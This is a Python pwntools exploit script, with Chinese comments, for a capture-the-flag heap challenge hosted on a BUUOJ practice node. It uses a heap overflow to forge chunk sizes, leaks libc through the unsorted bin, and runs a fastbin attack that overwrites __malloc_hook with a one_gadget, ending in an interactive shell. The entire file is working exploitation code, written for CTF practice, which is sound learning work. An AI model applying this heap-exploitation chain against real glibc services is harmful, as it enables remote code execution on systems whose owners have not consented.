# 第一道堆题
from pwn import *

p = remote('node4.buuoj.cn', 27876)
libc = ELF('../libcs/ubuntu16/x64/libc-2.23.so')

# 对应于菜单选项的操作函数封装
def alloc(size:int):
    p.sendline(b'1')
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    
def fill(index:int,content):
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(len(content)).encode())
    p.recvuntil(b'Content: ')
    p.send(content)
    
def free(index:int):
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    
def dump(index:int):
    p.sendline(b'4')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Content: \n')
    return p.recvline()
    
alloc(0x10) #idx0
alloc(0x10) #idx1
alloc(0x10) #idx2
alloc(0x10) #idx3
alloc(0x80) #idx4

free(1) #idx1
free(2) #idx2

# heap overflow to override size of chunk
payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21) + p8(0x80)
fill(0,payload)

payload = p64(0)*3 + p64(0x21)
fill(3,payload)

alloc(0x10) #idx1, the former idx2
alloc(0x10) #idx2, the former idx4

payload = p64(0)*3 + p64(0x91)
fill(3,payload)
alloc(0x80) #idx5, prevent the top chunk combine it
free(4) #idx2 got into unsorted bin, fd points to the main_arena

main_arena = u64(dump(2)[:8].strip().ljust(8,b'\x00')) - 0x58
malloc_hook = main_arena - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']
one_gadget = libc_base + 0x4526a

# 这里的0x60与后面的malloc_hook-0x23是相对应的，此处对应的chunk size为0x7f，刚好满足malloc(0x60)的需求，这是一个小知识点
alloc(0x60) #idx4
free(4) #idx2 got into fastbin
payload = p64(malloc_hook - 0x23)
fill(2,payload) #overwrite fd to fake chunk addr

alloc(0x60) #idx4
alloc(0x60) #idx6, our fake chunk

payload = b'A'*0x13 + p64(one_gadget)
fill(6,payload)

alloc(0x10)
p.interactive()